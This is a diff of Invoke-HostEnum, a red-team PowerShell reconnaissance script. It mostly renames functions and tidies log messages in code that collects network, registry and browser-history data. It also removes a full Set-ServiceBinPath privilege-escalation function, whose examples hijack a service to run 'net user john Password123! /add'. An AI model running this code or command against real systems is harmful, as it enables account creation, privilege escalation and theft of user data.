@@ -1,5 +1,5 @@
 <#
-HostEnum
+Invoke-HostEnum
 @andrewchiles
 https://github.com/threatexpress/red-team-scripts
 
@@ -13,7 +13,7 @@ Future Additions
 
 #requires -version 2
 
-function Invoke-HostEnum() {
+function Invoke-HostEnum {
 <#
 .SYNOPSIS
 
@@ -694,7 +694,7 @@ Gets detailed process information via WMI
     Return $procs
 }
     
-function Get-GroupMembership() {
+function Get-GroupMembership {
 <#
 .SYNOPSIS
 
@@ -725,7 +725,7 @@ Adapted from Beau Bullock's TCP code
 https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1
 
 #>
-    Write-Verbose "Enumerating Active Network Connections..."
+    Write-Verbose "Enumerating active network connections..."
     $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
     $Connections = $IPProperties.GetActiveTcpConnections()            
     foreach($Connection in $Connections) {            
@@ -748,7 +748,7 @@ function Get-ActiveListeners {
 Enumerates active TCP/UDP listeners.
 
 #>
-    Write-Verbose "Enumerating Active TCP/UDP Listeners..."     
+    Write-Verbose "Enumerating active TCP/UDP listeners..."     
     $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()         
     $TcpListeners = $IPProperties.GetActiveTCPListeners()
     $UdpListeners = $IPProperties.GetActiveUDPListeners()
@@ -788,7 +788,7 @@ Enumerates local firewall status from registry
     }
 }
     
-function Get-InterestingRegistryKeys() {
+function Get-InterestingRegistryKeys {
 <#
 .SYNOPSIS
 
@@ -1866,7 +1866,7 @@ function Get-BrowserInformation {
         }
     }
 
-    function Get-FireFoxHistory {
+    function Get-FirefoxHistory {
         $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
         if (-not (Test-Path -Path $Path)) {
             Write-Verbose "[-] Could not find FireFox History for username: $UserName"
@@ -1924,7 +1924,7 @@ Returns a list of URLs currently loaded in the browser
 Source: http://windowsitpro.com/powershell/retrieve-information-open-browsing-sessions
 #>
     Param([switch]$Full, [switch]$Location, [switch]$Content)
-    Write-Verbose "Enumerating Active Internet Explorer Windows"
+    Write-Verbose "Enumerating active Internet Explorer windows"
     $urls = (New-Object -ComObject Shell.Application).Windows() |
     Where-Object {$_.LocationUrl -match "(^https?://.+)|(^ftp://)"} |
     Where-Object {$_.LocationUrl}
@@ -3191,125 +3191,6 @@ function Add-ServiceDacl {
         }
     }
 }
-
-
-function Set-ServiceBinPath {
-<#
-    .SYNOPSIS
-
-        Sets the binary path for a service to a specified value.
-
-        Author: @harmj0y, Matthew Graeber (@mattifestation)
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Takes a service Name or a ServiceProcess.ServiceController on the pipeline and first opens up a
-        service handle to the service with ConfigControl access using the GetServiceHandle
-        Win32 API call. ChangeServiceConfig is then used to set the binary path (lpBinaryPathName/binPath)
-        to the string value specified by binPath, and the handle is closed off.
-
-        Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
-        Dacl field to each object. It does this by opening a handle with ReadControl for the
-        service with using the GetServiceHandle Win32 API call and then uses
-        QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.
-
-    .PARAMETER Name
-
-        An array of one or more service names to set the binary path for. Required.
-
-    .PARAMETER binPath
-
-        The new binary path (lpBinaryPathName) to set for the specified service. Required.
-
-    .OUTPUTS
-
-        $True if configuration succeeds, $False otherwise.
-
-    .EXAMPLE
-
-        PS C:\> Set-ServiceBinPath -Name VulnSvc -BinPath 'net user john Password123! /add'
-
-        Sets the binary path for 'VulnSvc' to be a command to add a user.
-
-    .EXAMPLE
-
-        PS C:\> Get-Service VulnSvc | Set-ServiceBinPath -BinPath 'net user john Password123! /add'
-
-        Sets the binary path for 'VulnSvc' to be a command to add a user.
-
-    .LINK
-
-        https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
-#>
-
-    param (
-        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
-        [Alias('ServiceName')]
-        [String[]]
-        [ValidateNotNullOrEmpty()]
-        $Name,
-
-        [Parameter(Position=1, Mandatory=$True)]
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $binPath
-    )
-
-    BEGIN {
-        filter Local:Get-ServiceConfigControlHandle {
-            [OutputType([IntPtr])]
-            param (
-                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
-                [ServiceProcess.ServiceController]
-                [ValidateNotNullOrEmpty()]
-                $TargetService
-            )
-
-            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
-
-            $ConfigControl = 0x00000002
-
-            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
-
-            $RawHandle
-        }
-    }
-
-    PROCESS {
-
-        ForEach($IndividualService in $Name) {
-
-            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
-            try {
-                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
-            }
-            catch {
-                $ServiceHandle = $Null
-                Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
-            }
-
-            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
-
-                $SERVICE_NO_CHANGE = [UInt32]::MaxValue
-
-                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$binPath", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
-                if ($Result -ne 0) {
-                    Write-Verbose "binPath for $IndividualService successfully set to '$binPath'"
-                    $True
-                }
-                else {
-                    Write-Error ([ComponentModel.Win32Exception] $LastError)
-                    $Null
-                }
-
-                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
-            }
-        }
-    }
-}
-
 
 function Test-ServiceDaclPermission {
 <#
